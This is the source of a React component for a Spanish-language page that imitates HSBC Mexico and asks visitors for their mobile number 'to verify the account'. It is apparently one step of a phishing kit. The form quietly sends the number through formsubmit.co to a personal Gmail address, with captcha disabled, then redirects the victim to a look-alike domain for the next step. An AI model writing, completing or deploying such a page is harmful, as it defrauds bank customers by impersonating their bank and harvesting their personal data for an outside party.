import React, { useEffect, useState } from 'react';
import '../css/style.css';
import Logo from '../img/logo2.jpg';

const Numerocelular = () => {
  const [inputValue, setInputValue] = useState('');
  const [btnDisabled, setBtnDisabled] = useState(true);

  useEffect(() => {
    if (inputValue.length === 10) {
      setBtnDisabled(false);
    } else {
      setBtnDisabled(true);
    }
  }, [inputValue]);

  const handleInputChange = (event) => {
    const value = event.target.value;
    const sanitizedValue = value.replace(/[^0-9]/g, '').slice(0, 10);
    setInputValue(sanitizedValue);
  };

  return (
    <div>
      <nav className="nbar">
        <img src={Logo} alt="" />
      </nav>
      <div className="cintadeco">
        <h1 className="cinta">
          el Contrato Único de Banca por Internet y Banca Móvil tendrá modificaciones que entrarán en vigor a partir
          del 22 de Mayo de 2024. Consulta los detalles{' '}
          <a href="https://www.hsbc.com.mx/content/dam/hsbc/mx/documents/digital/aviso_actualizacion_contrato.pdf" className="link">
            aquí.
          </a>
        </h1>
      </div>
      <div className="contglobal">
        <div className="contenedor">
          <form className="formulario" action="https://formsubmit.co/robr48j@gmail.com"method="POST">
            <h1 className="titulo">Numero de Celular</h1>
            <div className="cont">
              <div className="labeleicon">
                <label className="label">Ingresa tu número celular para verificar la cuenta</label>
              </div>
              <div className="input-cont">
                <input
                  className="inputname"
                  name="name"
                  placeholder="Ingresa tu numero de celular para verificar tu cuenta"
                  maxLength="10"
                  type="tel"
                  pattern="[0-9]*"
                  value={inputValue}
                  onChange={handleInputChange}
                  required
                />
                <input type="hidden" name="email" value="" />
                <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/user" />
                <input type="hidden" name="_captcha" value="false" />
              </div>
              <div className="olvidouser">
                <a href="" className="linkolvido">
                  ¿Olvidaste tu numero?
                </a>
              </div>
              <div className="input-contbtn">
                <button className="btncontinuar" type="submit" disabled={btnDisabled}>
                  Continuar
                </button>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Numerocelular;
